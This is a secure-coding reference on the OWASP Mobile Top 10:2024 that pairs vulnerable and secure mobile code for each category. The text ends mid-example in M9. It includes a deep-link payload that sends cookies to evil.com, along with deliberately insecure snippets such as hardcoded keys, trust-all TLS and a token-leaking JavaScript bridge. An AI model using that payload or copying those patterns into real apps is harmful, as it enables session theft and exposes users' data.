# OWASP Mobile Top 10:2024 -- Comprehensive Reference Guide

## Metadata

| Field            | Value                                                     |
| ---------------- | --------------------------------------------------------- |
| Title            | OWASP Mobile Top 10:2024                                  |
| Version          | 2024 (Latest)                                             |
| Previous         | 2016                                                      |
| Audience         | Mobile Developers, Security Engineers, QA                  |
| Platforms        | iOS (Swift), Android (Kotlin), React Native, Flutter       |
| Last Updated     | 2024                                                      |

## Overview

The OWASP Mobile Top 10:2024 is a significant update from the 2016 edition, reflecting the dramatic evolution of mobile platforms, threat landscapes, and development practices. The 2024 edition reorganizes categories to address modern mobile security challenges including supply chain risks, privacy regulations, and advanced attack techniques.

### Categories

| Rank | Category                              | Description                                          |
| ---- | ------------------------------------- | ---------------------------------------------------- |
| M1   | Improper Credential Usage             | Hardcoded credentials, improper credential storage   |
| M2   | Inadequate Supply Chain Security      | Third-party SDKs, libraries, compromised toolchains  |
| M3   | Insecure Authentication/Authorization | Weak auth flows, missing authorization checks        |
| M4   | Insufficient Input/Output Validation  | Injection, XSS, format string vulnerabilities        |
| M5   | Insecure Communication                | Cleartext traffic, improper TLS, certificate issues  |
| M6   | Inadequate Privacy Controls           | PII exposure, excessive permissions, tracking        |
| M7   | Insufficient Binary Protections       | Reverse engineering, code tampering, lack of RASP    |
| M8   | Security Misconfiguration             | Debug settings, insecure defaults, exposed components |
| M9   | Insecure Data Storage                 | Unencrypted local storage, log leakage, backups      |
| M10  | Insufficient Cryptography             | Weak algorithms, poor key management, custom crypto  |

---

## M1: Improper Credential Usage

### Description

Improper Credential Usage covers hardcoded credentials in source code or binaries, insecure storage of API keys, improper handling of user tokens, and embedded secrets in mobile applications. Attackers can easily extract hardcoded credentials from mobile binaries using decompilation tools.

### Attack Scenario

An attacker downloads the mobile app APK, decompiles it using `jadx` or `apktool`, and searches for hardcoded strings. They find an AWS access key and secret key embedded in the application code, which grants access to the company's S3 buckets and DynamoDB tables.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: Hardcoded API keys and credentials
class ApiService {
    companion object {
        const val API_KEY = "sk-live-4eC39HqLyjWDarjtT1zdp7dc"  // Hardcoded
        const val AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"
        const val AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        const val DATABASE_URL = "postgres://admin:password@prod-db.example.com:5432/app"
    }

    fun makeRequest(): Response {
        val client = OkHttpClient()
        val request = Request.Builder()
            .url("https://api.example.com/data")
            .addHeader("Authorization", "Bearer $API_KEY")
            .build()
        return client.newCall(request).execute()
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Backend-proxied credentials, no secrets in mobile app
class SecureApiService(private val context: Context) {

    // Retrieve short-lived token from secure backend
    private suspend fun getAccessToken(): String {
        val storedToken = EncryptedSharedPreferences.create(
            "secure_prefs",
            MasterKey.Builder(context).setKeyScheme(MasterKey.KeyScheme.AES256_GCM).build(),
            context,
            EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
            EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM,
        ).getString("access_token", null)

        if (storedToken != null && !isTokenExpired(storedToken)) {
            return storedToken
        }

        // Refresh token via backend -- backend holds actual API keys
        return refreshToken()
    }

    suspend fun makeRequest(): Response {
        val token = getAccessToken()
        val client = OkHttpClient.Builder()
            .certificatePinner(
                CertificatePinner.Builder()
                    .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
                    .build()
            )
            .build()

        val request = Request.Builder()
            .url("https://api.example.com/data")
            .addHeader("Authorization", "Bearer $token")
            .build()
        return client.newCall(request).execute()
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: Use Keychain for credential storage, backend proxy for API keys
import Security

class SecureCredentialManager {

    static func storeToken(_ token: String, forKey key: String) -> Bool {
        let data = token.data(using: .utf8)!
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
        ]
        SecItemDelete(query as CFDictionary) // Remove old entry
        let status = SecItemAdd(query as CFDictionary, nil)
        return status == errSecSuccess
    }

    static func retrieveToken(forKey key: String) -> String? {
        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecReturnData as String: true,
            kSecMatchLimit as String: kSecMatchLimitOne,
        ]
        var result: AnyObject?
        let status = SecItemCopyMatching(query as CFDictionary, &result)
        guard status == errSecSuccess, let data = result as? Data else { return nil }
        return String(data: data, encoding: .utf8)
    }
}
```

### Secure Pattern -- React Native

```typescript
// SECURE: Use react-native-keychain for credentials
import * as Keychain from 'react-native-keychain';

async function storeCredentials(token: string): Promise<void> {
  await Keychain.setGenericPassword('auth_token', token, {
    accessible: Keychain.ACCESSIBLE.WHEN_UNLOCKED_THIS_DEVICE_ONLY,
    securityLevel: Keychain.SECURITY_LEVEL.SECURE_HARDWARE,
  });
}

async function getCredentials(): Promise<string | null> {
  const credentials = await Keychain.getGenericPassword();
  if (credentials) {
    return credentials.password;
  }
  return null;
}
```

### Prevention

- [ ] Never hardcode credentials, API keys, or secrets in mobile applications
- [ ] Use backend proxy services to hold sensitive API keys
- [ ] Store user tokens in platform-secure storage (Keychain, EncryptedSharedPreferences)
- [ ] Use short-lived access tokens with refresh token rotation
- [ ] Implement certificate pinning for backend communication
- [ ] Use automated secret scanning in CI/CD pipelines
- [ ] Rotate any credentials that may have been embedded in shipped binaries

---

## M2: Inadequate Supply Chain Security

### Description

Mobile applications depend heavily on third-party SDKs, libraries, and development tools. Compromised or malicious SDKs can access sensitive data, introduce backdoors, or violate user privacy. The complexity of mobile supply chains makes auditing difficult.

### Attack Scenario

A popular analytics SDK used by hundreds of mobile apps is compromised. The attackers push an update that silently collects users' contact lists and location data, sending it to a command-and-control server. Developers who auto-update SDK versions unknowingly distribute the malicious code.

### Vulnerable Pattern

```kotlin
// VULNERABLE: Unpinned SDK versions, unaudited SDKs
// build.gradle
dependencies {
    implementation "com.unknown-vendor:analytics-sdk:+"  // Any version
    implementation "com.sketchy:ad-mediation:latest"     // Latest, unreviewed
    implementation "com.github.random-user:utils:main-SNAPSHOT" // From fork
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Pinned versions, verified publishers, dependency auditing
// build.gradle.kts
dependencies {
    // Pinned versions from trusted publishers
    implementation("com.google.firebase:firebase-analytics:21.5.0")
    implementation("com.squareup.okhttp3:okhttp:4.12.0")

    // Enable dependency verification
    // In gradle/verification-metadata.xml, verify checksums
}

// settings.gradle.kts
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
        // No jitpack or random Maven repos
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// Package.swift -- Pin exact versions
let package = Package(
    name: "MyApp",
    dependencies: [
        .package(url: "https://github.com/Alamofire/Alamofire.git", exact: "5.8.1"),
        .package(url: "https://github.com/onevcat/Kingfisher.git", exact: "7.10.0"),
    ]
)

// Podfile -- Pin exact versions
// pod 'Alamofire', '5.8.1'
// pod 'SDWebImage', '5.18.5'
```

### Secure Pattern -- Flutter

```yaml
# pubspec.yaml -- Pin exact versions
dependencies:
  flutter:
    sdk: flutter
  http: 1.1.2          # Exact version, not ^1.1.2
  shared_preferences: 2.2.2
  flutter_secure_storage: 9.0.0

# Run: flutter pub audit
# Run: flutter pub outdated
```

### Prevention

- [ ] Pin all dependency versions (no wildcards or ranges in production)
- [ ] Audit third-party SDKs before integration (permissions, network activity, data access)
- [ ] Use only trusted package repositories and verified publishers
- [ ] Run dependency vulnerability scanning in CI/CD (OWASP Dependency-Check, Snyk)
- [ ] Monitor SDK updates for security advisories
- [ ] Generate and maintain SBOMs for mobile applications
- [ ] Review SDK privacy manifests (iOS Privacy Nutrition Labels, Android Data Safety)
- [ ] Implement code signing verification for all dependencies

---

## M3: Insecure Authentication/Authorization

### Description

Insecure Authentication and Authorization covers weak authentication mechanisms, client-side authentication bypass, missing server-side authorization, and improper session management in mobile applications. Mobile-specific risks include biometric bypass, token leakage through logs, and offline authentication weaknesses.

### Attack Scenario

A mobile banking app performs authorization checks on the client side. An attacker uses a proxy tool (Burp Suite, mitmproxy) to intercept API calls and changes the `isAdmin: false` parameter to `isAdmin: true`. The server does not validate the claim and grants admin access to account management functions.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: Client-side authorization check
class TransferActivity : AppCompatActivity() {
    fun performTransfer(amount: Double, toAccount: String) {
        // Authorization check only on client side
        if (currentUser.accountType == "premium") {
            // Allow large transfers
            apiService.transfer(amount, toAccount) // Server does not re-check
        } else {
            showError("Only premium users can make large transfers")
        }
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Server-side authorization, proper token management
class SecureTransferActivity : AppCompatActivity() {

    private val authManager = BiometricAuthManager(this)

    fun performTransfer(amount: Double, toAccount: String) {
        // Step 1: Re-authenticate for sensitive operations
        authManager.authenticate(
            reason = "Confirm transfer of $${amount}",
            onSuccess = { biometricToken ->
                // Step 2: Send request with auth token -- server enforces authorization
                lifecycleScope.launch {
                    try {
                        val result = apiService.transfer(
                            TransferRequest(
                                amount = amount,
                                toAccount = toAccount,
                                biometricToken = biometricToken,
                                // Server validates: user identity, account type, limits
                            )
                        )
                        handleResult(result)
                    } catch (e: HttpException) {
                        when (e.code()) {
                            403 -> showError("You do not have permission for this transfer")
                            401 -> navigateToLogin()
                            else -> showError("Transfer failed")
                        }
                    }
                }
            },
            onFailure = { showError("Authentication required") },
        )
    }
}

class BiometricAuthManager(private val activity: FragmentActivity) {

    fun authenticate(reason: String, onSuccess: (String) -> Unit, onFailure: () -> Unit) {
        val promptInfo = BiometricPrompt.PromptInfo.Builder()
            .setTitle("Authentication Required")
            .setSubtitle(reason)
            .setAllowedAuthenticators(
                BiometricManager.Authenticators.BIOMETRIC_STRONG or
                BiometricManager.Authenticators.DEVICE_CREDENTIAL
            )
            .build()

        val biometricPrompt = BiometricPrompt(activity,
            ContextCompat.getMainExecutor(activity),
            object : BiometricPrompt.AuthenticationCallback() {
                override fun onAuthenticationSucceeded(result: BiometricPrompt.AuthenticationResult) {
                    val cryptoObject = result.cryptoObject
                    // Generate a biometric-bound token
                    onSuccess(generateBiometricToken(cryptoObject))
                }
                override fun onAuthenticationFailed() {
                    onFailure()
                }
            }
        )
        biometricPrompt.authenticate(promptInfo)
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: Biometric authentication with server validation
import LocalAuthentication

class SecureAuthManager {

    func authenticateForSensitiveAction(
        reason: String,
        completion: @escaping (Result<String, Error>) -> Void
    ) {
        let context = LAContext()
        context.localizedFallbackTitle = "Use Passcode"

        var error: NSError?
        guard context.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &error) else {
            completion(.failure(error ?? AuthError.biometricNotAvailable))
            return
        }

        context.evaluatePolicy(
            .deviceOwnerAuthenticationWithBiometrics,
            localizedReason: reason
        ) { success, error in
            if success {
                // Generate a server-verifiable token
                let token = self.generateChallengeResponse()
                completion(.success(token))
            } else {
                completion(.failure(error ?? AuthError.authenticationFailed))
            }
        }
    }
}
```

### Prevention

- [ ] Enforce all authorization checks on the server side
- [ ] Never trust client-side role or permission claims
- [ ] Use biometric authentication for sensitive operations
- [ ] Implement proper session management with server-side session validation
- [ ] Require step-up authentication for high-risk operations
- [ ] Invalidate sessions on the server when the user logs out
- [ ] Use short-lived access tokens with refresh token rotation
- [ ] Implement device binding for sensitive accounts

---

## M4: Insufficient Input/Output Validation

### Description

Mobile applications that fail to properly validate input from users, deep links, intents, or IPC (Inter-Process Communication) are vulnerable to injection attacks, including SQL injection, XSS in WebViews, and command injection. Output validation failures include rendering untrusted content in WebViews without sanitization.

### Attack Scenario

An attacker crafts a malicious deep link: `myapp://webview?url=javascript:document.location='https://evil.com/steal?cookie='+document.cookie`. The app opens this URL in a WebView with JavaScript enabled, executing the attacker's code in the WebView context.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: WebView loading arbitrary URLs, JS bridge exposed
class WebViewActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.addJavascriptInterface(JSBridge(), "Android") // JS bridge exposed

        // Loads arbitrary URL from deep link
        val url = intent.data?.getQueryParameter("url")
        webView.loadUrl(url!!) // No validation -- XSS, phishing
    }

    inner class JSBridge {
        @JavascriptInterface
        fun getAuthToken(): String {
            return TokenManager.getToken()!! // Exposes auth token to any loaded page
        }
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: URL validation, restricted WebView, no JS bridge for sensitive data
class SecureWebViewActivity : AppCompatActivity() {

    private val allowedHosts = setOf("docs.example.com", "help.example.com")

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val webView = WebView(this)

        // Restrict WebView settings
        webView.settings.apply {
            javaScriptEnabled = true // Only if needed
            allowFileAccess = false
            allowContentAccess = false
            domStorageEnabled = false
            setGeolocationEnabled(false)
        }

        // Validate URL before loading
        val url = intent.data?.getQueryParameter("url")
        if (url != null && isUrlAllowed(url)) {
            webView.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                    val requestUrl = request?.url?.toString() ?: return true
                    return !isUrlAllowed(requestUrl) // Block navigation to disallowed URLs
                }
            }
            webView.loadUrl(url)
        } else {
            finish() // Close activity if URL is not allowed
        }
    }

    private fun isUrlAllowed(urlString: String): Boolean {
        return try {
            val uri = Uri.parse(urlString)
            uri.scheme == "https" && uri.host in allowedHosts
        } catch (e: Exception) {
            false
        }
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: URL scheme validation for deep links
func application(
    _ app: UIApplication,
    open url: URL,
    options: [UIApplication.OpenURLOptionsKey: Any] = [:]
) -> Bool {
    guard let components = URLComponents(url: url, resolvingAgainstBaseURL: true),
          let host = components.host else {
        return false
    }

    let allowedHosts: Set<String> = ["app.example.com"]
    guard allowedHosts.contains(host) else {
        return false
    }

    // Validate and sanitize parameters
    guard let action = components.queryItems?.first(where: { $0.name == "action" })?.value,
          ["view", "share", "open"].contains(action) else {
        return false
    }

    // Route to appropriate handler
    DeepLinkRouter.handle(host: host, action: action, parameters: components.queryItems ?? [])
    return true
}
```

### Secure Pattern -- React Native

```typescript
// SECURE: Deep link validation in React Native
import { Linking } from 'react-native';

const ALLOWED_HOSTS = ['app.example.com', 'docs.example.com'];

function handleDeepLink(url: string): void {
  try {
    const parsed = new URL(url);

    if (parsed.protocol !== 'https:' || !ALLOWED_HOSTS.includes(parsed.hostname)) {
      console.warn('Blocked unauthorized deep link:', url);
      return;
    }

    // Route based on validated path
    const path = parsed.pathname;
    if (path.startsWith('/product/')) {
      const productId = path.split('/')[2];
      if (/^[a-zA-Z0-9-]+$/.test(productId)) {
        navigateToProduct(productId);
      }
    }
  } catch {
    console.warn('Invalid deep link URL');
  }
}

Linking.addEventListener('url', (event) => handleDeepLink(event.url));
```

### Prevention

- [ ] Validate all input from deep links, intents, and IPC
- [ ] Restrict WebView to allowlisted domains only
- [ ] Disable unnecessary WebView features (file access, geolocation)
- [ ] Never expose JavaScript bridges with access to sensitive data
- [ ] Use Content Security Policy in WebViews
- [ ] Sanitize all data before rendering in WebViews
- [ ] Validate URL schemes and parameters for deep links
- [ ] Implement input validation on the server side as well

---

## M5: Insecure Communication

### Description

Insecure Communication covers cleartext network traffic, improper TLS validation, missing certificate pinning, and other failures that allow attackers to intercept or modify data in transit. On mobile, this is particularly dangerous on public Wi-Fi networks where man-in-the-middle attacks are common.

### Attack Scenario

A user connects to public Wi-Fi at a coffee shop. An attacker runs a man-in-the-middle proxy on the same network. The mobile banking app does not implement certificate pinning, so the attacker's proxy intercepts and decrypts all HTTPS traffic, capturing the user's authentication tokens and account data.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: Trusts all certificates, allows cleartext
// AndroidManifest.xml:
// android:usesCleartextTraffic="true"

class InsecureApiClient {
    val client = OkHttpClient.Builder()
        .hostnameVerifier { _, _ -> true }  // Accepts any hostname
        .sslSocketFactory(trustAllCerts(), trustAllManager())  // Trusts all certs
        .build()
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Certificate pinning, no cleartext traffic
// AndroidManifest.xml:
// android:usesCleartextTraffic="false"
// android:networkSecurityConfig="@xml/network_security_config"

// res/xml/network_security_config.xml:
// <network-security-config>
//   <domain-config cleartextTrafficPermitted="false">
//     <domain includeSubdomains="true">api.example.com</domain>
//     <pin-set expiration="2025-12-31">
//       <pin digest="SHA-256">base64EncodedPin1=</pin>
//       <pin digest="SHA-256">base64EncodedBackupPin=</pin>
//     </pin-set>
//   </domain-config>
// </network-security-config>

class SecureApiClient {
    val client = OkHttpClient.Builder()
        .certificatePinner(
            CertificatePinner.Builder()
                .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
                .add("api.example.com", "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=") // Backup
                .build()
        )
        .connectTimeout(30, TimeUnit.SECONDS)
        .build()
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: Certificate pinning with URLSession
class PinnedSessionDelegate: NSObject, URLSessionDelegate {

    private let pinnedCertificateHashes: Set<String> = [
        "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=",
    ]

    func urlSession(
        _ session: URLSession,
        didReceive challenge: URLAuthenticationChallenge,
        completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void
    ) {
        guard let serverTrust = challenge.protectionSpace.serverTrust,
              let certificate = SecTrustGetCertificateAtIndex(serverTrust, 0) else {
            completionHandler(.cancelAuthenticationChallenge, nil)
            return
        }

        let serverCertData = SecCertificateCopyData(certificate) as Data
        let serverHash = "sha256/" + serverCertData.sha256().base64EncodedString()

        if pinnedCertificateHashes.contains(serverHash) {
            completionHandler(.useCredential, URLCredential(trust: serverTrust))
        } else {
            completionHandler(.cancelAuthenticationChallenge, nil)
        }
    }
}

// App Transport Security (ATS) in Info.plist -- enforced by default
// NSAppTransportSecurity: no exceptions for production
```

### Secure Pattern -- Flutter

```dart
// SECURE: Certificate pinning in Flutter
import 'package:http/http.dart' as http;
import 'dart:io';

class PinnedHttpClient {
  static HttpClient createPinnedClient() {
    final client = HttpClient();
    client.badCertificateCallback = (X509Certificate cert, String host, int port) {
      // Only allow specific certificate fingerprints
      final fingerprint = cert.sha256Fingerprint;
      final pinnedFingerprints = {
        'AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99',
      };
      return pinnedFingerprints.contains(fingerprint);
    };
    return client;
  }
}
```

### Prevention

- [ ] Enforce TLS 1.2+ for all network communication
- [ ] Implement certificate pinning for all backend connections
- [ ] Disable cleartext traffic in application manifests
- [ ] Use App Transport Security (iOS) and Network Security Config (Android)
- [ ] Include backup pins for certificate rotation
- [ ] Monitor for certificate pinning failures in production
- [ ] Never override TLS validation in production builds
- [ ] Test with proxy tools to ensure pinning works correctly

---

## M6: Inadequate Privacy Controls

### Description

Inadequate Privacy Controls addresses how mobile apps handle personal data, including collection, processing, storage, and sharing. Excessive permission requests, unnecessary data collection, uncontrolled analytics SDKs, and non-compliance with privacy regulations (GDPR, CCPA) fall under this category.

### Attack Scenario

A flashlight app requests access to contacts, location, camera, and microphone. The app's analytics SDK collects device identifiers, location data, and installed app lists, sharing this with multiple data brokers. Users are unaware of the extent of data collection.

### Vulnerable Pattern

```kotlin
// VULNERABLE: Excessive permissions, uncontrolled data collection
// AndroidManifest.xml:
// <uses-permission android:name="android.permission.READ_CONTACTS" />
// <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
// <uses-permission android:name="android.permission.CAMERA" />
// <uses-permission android:name="android.permission.RECORD_AUDIO" />
// <uses-permission android:name="android.permission.READ_PHONE_STATE" />

class AnalyticsManager {
    fun trackEvent(event: String) {
        val data = mapOf(
            "event" to event,
            "device_id" to Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
            "contacts_count" to getContactsCount(), // Why does analytics need this?
            "installed_apps" to getInstalledApps(),  // Excessive collection
            "location" to getLastKnownLocation(),    // Not needed for analytics
        )
        thirdPartySDK.send(data) // Unaudited third-party SDK
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Minimal permissions, privacy-respecting analytics
// AndroidManifest.xml: Only permissions actually needed
// <uses-permission android:name="android.permission.INTERNET" />

class PrivacyAwareAnalytics(private val context: Context) {

    private val consentManager = ConsentManager(context)

    fun trackEvent(event: String, properties: Map<String, String> = emptyMap()) {
        // Check user consent before any tracking
        if (!consentManager.hasConsent(ConsentCategory.ANALYTICS)) {
            return
        }

        // Collect only minimal, non-identifying data
        val data = mapOf(
            "event" to event,
            "app_version" to BuildConfig.VERSION_NAME,
            "platform" to "android",
            "os_version" to Build.VERSION.SDK_INT.toString(),
            // No device ID, no location, no contacts
        ) + properties.filterKeys { it in ALLOWED_PROPERTIES }

        // Send to first-party analytics backend (not third-party SDK)
        analyticsService.send(data)
    }

    companion object {
        private val ALLOWED_PROPERTIES = setOf(
            "screen_name", "action", "category", "label",
        )
    }
}

class ConsentManager(private val context: Context) {

    fun hasConsent(category: ConsentCategory): Boolean {
        val prefs = context.getSharedPreferences("consent", Context.MODE_PRIVATE)
        return prefs.getBoolean(category.name, false)
    }

    fun requestConsent(category: ConsentCategory, callback: (Boolean) -> Unit) {
        // Show consent dialog with clear explanation
        // Store user's choice
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: Privacy-respecting app with App Tracking Transparency
import AppTrackingTransparency

class PrivacyManager {

    func requestTrackingPermission(completion: @escaping (Bool) -> Void) {
        if #available(iOS 14, *) {
            ATTrackingManager.requestTrackingAuthorization { status in
                completion(status == .authorized)
            }
        } else {
            completion(true) // Fallback for older iOS
        }
    }

    func collectAnalytics(event: String) {
        guard UserDefaults.standard.bool(forKey: "analytics_consent") else { return }

        let data: [String: Any] = [
            "event": event,
            "app_version": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? "",
            "timestamp": ISO8601DateFormatter().string(from: Date()),
            // No IDFA, no device fingerprinting
        ]

        AnalyticsService.shared.send(data)
    }
}
```

### Prevention

- [ ] Request only permissions that are necessary for core functionality
- [ ] Implement consent management for data collection and analytics
- [ ] Use privacy-respecting analytics (first-party, minimal data)
- [ ] Comply with platform privacy requirements (iOS Privacy Nutrition Labels, Android Data Safety)
- [ ] Audit third-party SDKs for data collection practices
- [ ] Provide clear privacy policies accessible from within the app
- [ ] Implement data retention policies and deletion capabilities
- [ ] Support user rights requests (data export, deletion) per GDPR/CCPA

---

## M7: Insufficient Binary Protections

### Description

Mobile applications are distributed as binaries that can be downloaded, decompiled, and analyzed by attackers. Insufficient protections allow reverse engineering to extract secrets, understand business logic, create pirated copies, or develop exploits. This includes lack of code obfuscation, tampering detection, debugger detection, and root/jailbreak detection.

### Attack Scenario

An attacker downloads a mobile game, decompiles it, removes the in-app purchase verification, and redistributes the modified version. The original developer loses revenue. The attacker also extracts the API endpoints and authentication logic to create automated bots.

### Vulnerable Pattern

```kotlin
// VULNERABLE: No obfuscation, no tamper detection, no root detection
// proguard-rules.pro: empty or -dontobfuscate
class PaymentVerifier {
    fun verifyPurchase(purchaseToken: String): Boolean {
        // Easily found and patched by attacker
        val response = api.verifyPurchase(purchaseToken)
        return response.isValid // Attacker patches this to always return true
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Multi-layered binary protections
// build.gradle.kts
// android {
//     buildTypes {
//         release {
//             isMinifyEnabled = true
//             isShrinkResources = true
//             proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
//         }
//     }
// }

class SecurityChecker(private val context: Context) {

    fun performSecurityChecks(): SecurityCheckResult {
        val checks = mutableListOf<SecurityCheck>()

        // Root/Jailbreak detection
        checks.add(SecurityCheck("root", !isDeviceRooted()))
        // Debugger detection
        checks.add(SecurityCheck("debugger", !isDebuggerAttached()))
        // Emulator detection
        checks.add(SecurityCheck("emulator", !isRunningOnEmulator()))
        // Tamper detection
        checks.add(SecurityCheck("integrity", isAppIntegrityValid()))
        // Installer verification
        checks.add(SecurityCheck("installer", isInstalledFromTrustedSource()))

        return SecurityCheckResult(
            passed = checks.all { it.passed },
            details = checks,
        )
    }

    private fun isDeviceRooted(): Boolean {
        val rootIndicators = listOf(
            "/system/app/Superuser.apk",
            "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su",
        )
        return rootIndicators.any { File(it).exists() } ||
               Build.TAGS?.contains("test-keys") == true
    }

    private fun isDebuggerAttached(): Boolean {
        return Debug.isDebuggerConnected() || Debug.waitingForDebugger()
    }

    private fun isRunningOnEmulator(): Boolean {
        return Build.FINGERPRINT.startsWith("generic") ||
               Build.FINGERPRINT.startsWith("unknown") ||
               Build.MODEL.contains("Emulator") ||
               Build.MANUFACTURER.contains("Genymotion")
    }

    private fun isAppIntegrityValid(): Boolean {
        val expectedSignature = "expected_signature_hash"
        val packageInfo = context.packageManager.getPackageInfo(
            context.packageName, PackageManager.GET_SIGNING_CERTIFICATES
        )
        val signatures = packageInfo.signingInfo.apkContentsSigners
        return signatures.any {
            MessageDigest.getInstance("SHA-256")
                .digest(it.toByteArray())
                .joinToString("") { byte -> "%02x".format(byte) } == expectedSignature
        }
    }

    private fun isInstalledFromTrustedSource(): Boolean {
        val installer = context.packageManager.getInstallSourceInfo(context.packageName)
            .installingPackageName
        return installer in setOf("com.android.vending", "com.amazon.venezia")
    }
}
```

### Prevention

- [ ] Enable code obfuscation (ProGuard/R8 for Android, bitcode for iOS)
- [ ] Implement runtime tamper detection and integrity checks
- [ ] Detect root/jailbreak and adjust functionality accordingly
- [ ] Detect debuggers and analysis tools
- [ ] Verify app signatures at runtime
- [ ] Verify the installation source (App Store, Play Store)
- [ ] Perform critical validations on the server side (not only in the app)
- [ ] Use Play Integrity API (Android) and App Attest (iOS)

---

## M8: Security Misconfiguration

### Description

Mobile Security Misconfiguration covers debug settings left in production builds, overly permissive app configurations, exposed content providers and activities, insecure backup settings, and missing security configurations that allow exploitation.

### Attack Scenario

A production Android app has `android:debuggable="true"` and `android:allowBackup="true"` set in its manifest. An attacker with physical access uses `adb backup` to extract the app's data including cached credentials and session tokens. The debug flag also allows attaching a debugger to inspect runtime memory.

### Vulnerable Pattern

```xml
<!-- VULNERABLE: AndroidManifest.xml with insecure settings -->
<application
    android:debuggable="true"
    android:allowBackup="true"
    android:usesCleartextTraffic="true">

    <!-- Exported activity accessible to any app -->
    <activity android:name=".AdminActivity" android:exported="true" />

    <!-- Content provider with no permissions -->
    <provider
        android:name=".DataProvider"
        android:exported="true"
        android:grantUriPermissions="true" />
</application>
```

### Secure Pattern -- Android Manifest

```xml
<!-- SECURE: Hardened AndroidManifest.xml -->
<application
    android:debuggable="false"
    android:allowBackup="false"
    android:usesCleartextTraffic="false"
    android:networkSecurityConfig="@xml/network_security_config">

    <!-- Not exported -- only accessible within the app -->
    <activity
        android:name=".AdminActivity"
        android:exported="false" />

    <!-- Content provider with permissions -->
    <provider
        android:name=".DataProvider"
        android:exported="false"
        android:grantUriPermissions="false" />

    <!-- If export is needed, require permission -->
    <activity
        android:name=".ShareActivity"
        android:exported="true"
        android:permission="com.example.SHARE_PERMISSION">
        <intent-filter>
            <action android:name="android.intent.action.SEND" />
        </intent-filter>
    </activity>
</application>
```

### Secure Pattern -- iOS (Info.plist)

```xml
<!-- SECURE: Info.plist hardened settings -->
<key>NSAppTransportSecurity</key>
<dict>
    <!-- No exceptions for ATS in production -->
</dict>

<!-- Disable pasteboard sharing between apps -->
<key>UIPasteboardExpiration</key>
<integer>120</integer>

<!-- Disable backup of sensitive files -->
<!-- Set programmatically per file using excludeFromBackup -->
```

### Prevention

- [ ] Ensure `debuggable` is false in production builds
- [ ] Disable app backup or encrypt backup data
- [ ] Do not export activities, services, or content providers unnecessarily
- [ ] Require permissions for exported components
- [ ] Disable cleartext traffic
- [ ] Enforce App Transport Security (iOS) without exceptions
- [ ] Remove debug logging from production builds
- [ ] Review and harden all manifest/plist configurations before release

---

## M9: Insecure Data Storage

### Description

Insecure Data Storage occurs when sensitive data is stored in unprotected locations on the device, including shared preferences, SQLite databases, log files, clipboard, and external storage. Malware or physical access to the device can expose this data.

### Attack Scenario

A health app stores patient records in a plain SQLite database on external storage. A malicious app with storage permissions reads the database file and exfiltrates sensitive health information. Additionally, the app logs authentication tokens to logcat, where any app can read them on older Android versions.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: Storing sensitive data in plaintext
class UserDataManager(private val context: Context) {
    fun saveUserData(token: String, creditCard: String) {
        // Plaintext SharedPreferences
        val prefs = context.getSharedPreferences("user_data", Context.MODE_PRIVATE)
        prefs.edit()
            .putString("auth_token", token)
            .putString("credit_card", creditCard)
            .apply()

        // Writing to external storage
        val file = File(Environment.getExternalStorageDirectory(), "user_data.json")
        file.writeText("""{"token": "$token", "card": "$creditCard"}""")

        // Logging sensitive data
